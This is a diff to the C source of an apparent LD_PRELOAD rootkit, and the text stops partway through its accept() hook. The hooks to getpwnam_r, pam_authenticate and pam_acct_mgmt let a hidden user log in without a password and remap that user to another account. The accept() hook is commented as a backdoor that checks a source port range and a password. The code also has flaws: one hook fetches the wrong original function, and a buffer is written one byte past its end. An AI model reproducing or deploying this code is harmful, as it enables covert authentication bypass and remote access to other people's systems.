@@ -46,14 +46,6 @@ void init(void)
     char *caller = NULL;
     size_t len = 0;
 
-    const char *libc_names[] = \
-    {
-        "getpwnam_r",
-        "pam_authenticate",
-        "pam_acct_mgmt",
-        "accept"
-    };
-
     if((handle = fopen("/proc/self/cmdline", "r")))
     {
         while(getdelim(&caller, &len, 0, handle) != -1)
@@ -70,8 +62,8 @@ void init(void)
     }
 
     /* Initialise: pointers to libc functions. */
-    for(i = 0; i < N_LIBCALLS; i++)
-        libcalls[i] = dlsym(RTLD_NEXT, libc_names[i]);
+    for(i = 0; i < num_libcalls; i++)
+        libcalls[i].callback = dlsym(RTLD_NEXT, libcalls[i].name);
 
     debug("init() done.\n");
 }
@@ -162,26 +154,41 @@ int watchdog(char *name)
 /* PAM hooks: */
 int getpwnam_r(const char *name, struct passwd *pwd, char *buf, size_t buflen, struct passwd **result)
 {
-    if(strcmp(SU_USER, name) == 0)
-        return (int) libcalls[GETPWNAM_R](JACK_USER, pwd, buf, buflen, result);
+    libcall orig_getpwnam_r = getlibcall("getpwnam_r");
 
-    return (int) libcalls[GETPWNAM_R](name, pwd, buf, buflen, result);
+    if(strcmp(SU_USER, name) == 0)
+        return orig_getpwnam_r(JACK_USER, pwd, buf, buflen, result);
+
+    return orig_getpwnam_r(name, pwd, buf, buflen, result);
+}
+
+struct passwd *getpwnam(const char *name)
+{
+    char buf[1024];
+    struct passwd *pwd = malloc(sizeof(struct passwd));
+    struct passwd **result = malloc(sizeof(struct passwd *));
+
+    getpwnam_r(name, pwd, buf, sizeof(buf), result);  
+    return pwd;
 }
 
 int pam_authenticate(pam_handle_t *pamh, int flags)
 {
+    libcall orig_pam_authenticate = getlibcall("pam_authenticate");
     const void *item;
 
     pam_get_item(pamh, PAM_USER, &item);
 
+    debug("item: %s\n", item);
     if(strcmp(SU_USER, item) == 0)
         return PAM_SUCCESS;
 
-    return (int) libcalls[PAM_AUTHENTICATE](pamh, flags);
+    return orig_pam_authenticate(pamh, flags);
 }
 
 int pam_acct_mgmt(pam_handle_t *pamh, int flags)
 {
+    libcall orig_pam_acct_mgmt = getlibcall("pam_authenticate");
     const void *item;
 
     pam_get_item(pamh, PAM_USER, &item);
@@ -189,12 +196,13 @@ int pam_acct_mgmt(pam_handle_t *pamh, int flags)
     if(strcmp(SU_USER, item) == 0)
         return PAM_SUCCESS;
 
-    return (int) libcalls[PAM_ACCT_MGMT](pamh, flags);
+    return orig_pam_acct_mgmt(pamh, flags);
 }
 
 /* accept() hook/backdoor */
 int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen)
 {
+    libcall orig_accept = getlibcall("accept");
     const size_t pass_len = strlen(SHELL_PASS);
     char password[pass_len];
     unsigned short int port;
@@ -202,7 +210,7 @@ int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen)
 
     password[pass_len] = '\0';
 
-    retfd = (int) libcalls[ACCEPT](sockfd, addr, addrlen);
+    retfd = orig_accept(sockfd, addr, addrlen);
     port  = ntohs(((struct sockaddr_in *) addr)->sin_port);
 
     if(port >= LOW_PORT && port <= HIGH_PORT)
